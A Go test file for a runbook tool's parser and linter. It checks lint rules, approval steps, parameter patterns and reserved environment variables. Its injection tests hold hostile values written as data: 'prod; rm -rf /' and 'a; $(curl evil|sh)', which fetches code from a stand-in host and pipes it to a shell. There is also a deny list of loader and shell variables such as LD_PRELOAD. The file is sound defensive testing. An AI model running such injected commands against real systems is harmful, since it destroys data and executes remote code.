package runbook

import (
	"os"
	"strings"
	"testing"

	"github.com/peacedouts/nightfix/internal/expr"
)

func load(t *testing.T) []byte {
	t.Helper()
	b, err := os.ReadFile("../../examples/runbooks/ecs-service-restart.yaml")
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestExampleIsValid(t *testing.T) {
	rb, err := Parse(load(t))
	if err != nil {
		t.Fatal(err)
	}
	if is := Lint(rb); len(is) > 0 {
		t.Fatalf("unexpected issues: %v", is)
	}
	if !rb.Spec.Steps[1].IsIdempotent() || rb.Spec.Steps[2].IsIdempotent() {
		t.Fatal("DescribeServices should be idempotent, UpdateService should not")
	}
}

func TestDigestIgnoresFormatting(t *testing.T) {
	a, _ := Parse(load(t))
	// Same content, different key order and quoting.
	reordered := strings.Replace(string(load(t)), "  team: platform\n  tags: [ecs, restart]\n",
		"  tags: [\"ecs\", \"restart\"]\n  team: platform\n", 1)
	b, err := Parse([]byte(reordered))
	if err != nil {
		t.Fatal(err)
	}
	_, da, _ := Canonical(a)
	_, db, _ := Canonical(b)
	if da != db {
		t.Fatalf("digests differ: %s vs %s", da, db)
	}
	ca, _, _ := Canonical(a)
	back, err := FromCanonical(ca)
	if err != nil {
		t.Fatal(err)
	}
	if _, d2, _ := Canonical(back); d2 != da {
		t.Fatal("canonical round trip changed the digest")
	}
}

func lintErrs(t *testing.T, mutate func(string) string) string {
	t.Helper()
	rb, err := Parse([]byte(mutate(string(load(t)))))
	if err != nil {
		return err.Error()
	}
	return Lint(rb).Error()
}

func TestLintRules(t *testing.T) {
	cases := []struct {
		name, old, new, want string
	}{
		{"template in run", "    - id: restart\n", "    - id: sh\n      type: shell\n      run: echo ${{ params.service }}\n    - id: restart\n", "templates are not allowed in run"},
		{"from without pattern", "      pattern: \"^[A-Za-z0-9_-]{1,255}$\"\n    service:", "    service:", "must declare a pattern"},
		{"auto without services", "      services: [checkout-api]\n", "", "auto triggers must list the services"},
		{"auto without cooldown", "      cooldown: 15m\n", "", "cooldown: required"},
		{"secret in aws input", "        forceNewDeployment: true\n", "        forceNewDeployment: true\n        token: ${{ secrets.x }}\n", "secrets may only be referenced"},
		{"unknown field", "  policy:\n", "  polcy:\n    x: 1\n  policy:\n", "unknown field"},
		{"unsupported type", "      type: note\n", "      type: python\n", "not supported in this build"},
		{"viewer approver", "    - id: restart\n", "    - id: approve\n      type: approval\n      fromRoles: [Viewer]\n    - id: restart\n", "viewers can't approve"},
		{"unknown approver role", "    - id: restart\n", "    - id: approve\n      type: approval\n      fromRoles: [Boss]\n    - id: restart\n", "must be Responder, Admin or Owner"},
		{"approval outlives run", "    - id: restart\n", "    - id: approve\n      type: approval\n      expiresAfter: 1h\n    - id: restart\n", "longer than the run timeout"},
		{"approval with timeout", "    - id: restart\n", "    - id: approve\n      type: approval\n      timeout: 5m\n    - id: restart\n", "take expiresAfter, not timeout"},
		{"approval count", "    - id: restart\n", "    - id: approve\n      type: approval\n      count: 11\n    - id: restart\n", "between 1 and 10"},
		{"reserved env name", "    - id: restart\n", "    - id: sh\n      type: shell\n      env:\n        BASH_ENV: x\n      run: echo hi\n    - id: restart\n", "BASH_ENV is reserved"},
		{"loader env name", "    - id: restart\n", "    - id: sh\n      type: shell\n      env:\n        LD_PRELOAD: x\n      run: echo hi\n    - id: restart\n", "LD_PRELOAD is reserved"},
		{"non read-only wait", "          action: DescribeServices\n          input:\n            cluster", "          action: UpdateService\n          input:\n            cluster", "wait checks must be read-only"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := lintErrs(t, func(s string) string {
				if !strings.Contains(s, c.old) {
					t.Fatalf("fixture text %q not found", c.old)
				}
				return strings.Replace(s, c.old, c.new, 1)
			})
			if !strings.Contains(got, c.want) {
				t.Fatalf("want %q in %q", c.want, got)
			}
		})
	}
}

// An approval step is allowed even on an auto runbook: it pauses the run and
// pages the approvers (runbook-schema.md §3.5).
func TestApprovalStepPublishes(t *testing.T) {
	src := strings.Replace(string(load(t)), "    - id: restart\n",
		"    - id: approve\n      name: Approve the restart\n      type: approval\n      count: 1\n      fromRoles: [Admin]\n"+
			"      excludeRequester: true\n      expiresAfter: 10m\n    - id: restart\n", 1)
	rb, err := Parse([]byte(src))
	if err != nil {
		t.Fatal(err)
	}
	if is := Lint(rb); len(is) > 0 {
		t.Fatalf("unexpected issues: %v", is)
	}
	st := rb.Spec.Steps[2]
	if !st.RunsOnControlPlane() || st.ApprovalCount() != 1 || st.ApprovalRoles()[0] != "admin" || st.ApprovalExpiry().Minutes() != 10 {
		t.Fatalf("approval step parsed wrong: %+v", st)
	}
}

func TestResolveParams(t *testing.T) {
	rb, _ := Parse(load(t))
	ctx := expr.Vars{"alert": map[string]any{"labels": map[string]any{"cluster": "prod-east", "service": "checkout-api"}}}
	p, err := ResolveParams(rb, nil, ctx)
	if err != nil || p["cluster"] != "prod-east" || p["service"] != "checkout-api" {
		t.Fatalf("got %v %v", p, err)
	}
	// Injection attempt via alert labels is rejected by the pattern.
	ctx = expr.Vars{"alert": map[string]any{"labels": map[string]any{"cluster": "prod; rm -rf /", "service": "x"}}}
	if _, err := ResolveParams(rb, nil, ctx); err == nil || !strings.Contains(err.Error(), "does not match") {
		t.Fatalf("expected pattern rejection, got %v", err)
	}
	if err := ValidateParams(rb, map[string]any{"cluster": "a", "service": "b", "extra": 1}); err == nil {
		t.Fatal("unknown param accepted")
	}
}

func TestPatternsMatchTheWholeValue(t *testing.T) {
	src := strings.Replace(string(load(t)), `pattern: "^[A-Za-z0-9_-]{1,255}$"`, `pattern: "[a-z]+"`, 1)
	rb, err := Parse([]byte(src))
	if err != nil {
		t.Fatal(err)
	}
	// An unanchored pattern used to accept anything containing a match.
	ctx := expr.Vars{"alert": map[string]any{"labels": map[string]any{"cluster": "a; $(curl evil|sh)", "service": "x"}}}
	if _, err := ResolveParams(rb, nil, ctx); err == nil {
		t.Fatal("unanchored pattern accepted an injection payload")
	}
	ctx = expr.Vars{"alert": map[string]any{"labels": map[string]any{"cluster": "prodeast", "service": "x"}}}
	if _, err := ResolveParams(rb, nil, ctx); err != nil {
		t.Fatalf("a whole-value match was rejected: %v", err)
	}
}

func TestReservedEnv(t *testing.T) {
	for _, k := range []string{"BASH_ENV", "ENV", "PATH", "IFS", "LD_PRELOAD", "BASH_FUNC_x", "DYLD_INSERT_LIBRARIES", "PS4"} {
		if !ReservedEnv(k) {
			t.Errorf("%s not reserved", k)
		}
	}
	for _, k := range []string{"PGHOST", "AWS_REGION", "SERVICE"} {
		if ReservedEnv(k) {
			t.Errorf("%s reserved", k)
		}
	}
}
